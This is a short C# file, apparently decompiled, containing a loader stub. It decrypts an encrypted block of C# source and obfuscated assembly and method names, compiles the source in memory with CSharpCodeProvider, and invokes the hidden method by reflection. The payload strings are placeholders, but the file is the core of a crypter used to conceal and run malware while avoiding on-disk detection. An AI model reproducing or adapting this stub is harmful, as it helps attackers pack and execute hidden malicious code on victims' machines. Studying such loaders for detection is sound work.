using System;
using System.CodeDom.Compiler;
using Microsoft.CSharp;

namespace MainApp
{
	// Token: 0x02000004 RID: 4
	internal class GetPool
	{
		// Token: 0x06000005 RID: 5 RVA: 0x000020CC File Offset: 0x000002CC
		public static void Pool()
		{
			string text = "encryptedc#code";
			new CSharpCodeProvider().CompileAssemblyFromSource(new CompilerParameters
			{
				ReferencedAssemblies =
				{
					Mass.Bike("System.dll but encrypted", PoolStrike.Refact),
															   Mass.Bike("System.Core.dll but encrypted", PoolStrike.Refact)
				},
				GenerateInMemory = true
			}, new string[] { Mass.Bike(text, PoolStrike.Refact) }).CompiledAssembly.GetType(Mass.Bike("LoadApiName but encrypted", PoolStrike.Refact)).GetMethod(Mass.Bike("ReloadPick but encrypted", PoolStrike.Refact)).Invoke(null, null);
		}
	}
}
